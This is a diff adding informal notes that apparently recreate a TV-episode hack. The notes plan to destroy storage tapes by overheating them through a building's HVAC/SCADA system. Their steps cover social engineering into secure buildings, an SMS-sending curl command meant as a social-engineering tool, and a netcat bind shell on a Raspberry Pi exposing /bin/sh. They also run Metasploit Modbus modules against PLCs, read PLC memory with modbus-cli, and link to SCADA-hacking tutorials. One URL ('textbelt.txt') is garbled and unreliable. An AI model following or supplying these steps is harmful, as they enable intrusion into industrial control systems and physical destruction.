@@ -1,0 +1,63 @@
+Episode name: eps1.4_3xpl0its.wmv
+
+electromagnetic tapes would disintegrate on high enough temperature - hack is to raise the temperature = hack the HVAC system which is a SCADA ICS system
+
+0. social engineer a way into the highly secure buildings 
+
+1. connect the Raspberry Pi to the network
+
+2. there was a problem in the meantime: they have to spoof an sms message. so lets see how that is done. Lets use textbelt.com
+
+$ curl -X POST https://textbelt.txt/text --data-urlencode phone='<phone number>' --data-urlencode message='<message>' -d key=<api key from the website> 
+    // the legal stuff forbids to spoof the sender's phone number
+
+use this as a social engineering tool!
+
+
+Lets create the Raspberry Pi:
+    kali.org/get-kali 
+        download arm version on kali to flash raspberry Pi
+        create an image on an sd card - boot from sd card
+
+        create a netcat connection between RPi and laptop - so that it can be controlled remotely
+
+        $ sudo nc -l -p1234 -e /bin/sh
+            - execute on RPi
+
+        $ sudo nc <ip> <port>
+            - execute on the remote laptop
+
+Now that we are connected we can explore that HVAC system 
+
+    $ msfconsole
+
+    $ search modbus - most widely used protocol for HVAC systems
+
+    $ use auxiliary/scanner/scada/modbus_findunitid 
+
+    $ ...
+
+    $ set RHOSTS <ip>
+
+    $ show options
+
+    $ exploit...
+
+    $ use auxiliary/admin/scada/modicon_command
+
+    $ show options/ set RHOSTS etc... run
+
+    lets probe the memory of those PLCs, pulling more information
+    $ gem install modbus-cli
+
+    $ sudo modbus read <ip> %MW100 100
+
+    $ sudo modbus read <ip> %MD100 100
+
+    $ sudo modbus read <ip> %MF100 100
+
+
+
+https://www.hackers-arise.com/post/2016/08/05/scada-hacking-hacking-the-schneider-automated-building-system
+https://www.hackers-arise.com/post/2017/03/28/SCADA-Hacking-Hacking-the-Schneider-Electric-TM221-Modicon-PLC-using-modbus-cli
+
